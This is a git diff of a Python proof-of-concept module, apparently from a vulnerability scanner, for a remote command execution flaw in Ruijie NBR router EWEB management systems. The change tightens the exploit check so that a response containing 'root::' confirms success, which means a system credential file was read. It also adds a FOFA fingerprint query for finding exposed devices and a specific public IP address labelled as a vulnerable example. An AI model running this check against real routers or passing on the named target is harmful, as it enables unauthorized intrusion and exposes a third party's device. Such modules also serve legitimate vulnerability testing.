@@ -10,11 +10,13 @@ class POC(POCBase):
 
     _info = {
         "author" : "jijue",                      # POC作者
-        "version" : "1",                    # POC版本，默认是1  
+        "version" : "2",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-        略  
+            v1:略  
+            v2:经huangstts同学指出，第一个版本检测逻辑过于简单，容易产生大量误报，
+                该版本进行了逻辑优化，感谢huangstts同学，祝使用愉快  
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞",                        # 漏洞名称
@@ -30,7 +32,7 @@ class POC(POCBase):
             title="锐捷网络-EWEB网管系统"
             icon_hash="-692947551"
         """,                     # fofa搜索语句
-        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
+        "example" : "https://222.169.90.53:4430",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
     }
 
@@ -58,9 +60,9 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req0 = requests.post(url0,data=data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req0.status_code == 200 :
+            if req0.status_code == 200 and len(req0.text) == 0 and req0.headers["Content-Type"] == "text/html":
                 req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-                if req1.status_code == 200:
+                if req1.status_code == 200 and "root::" in req1.text:
                     vuln = [True,req1.text]
             else:
                 vuln = [False,req0.text]
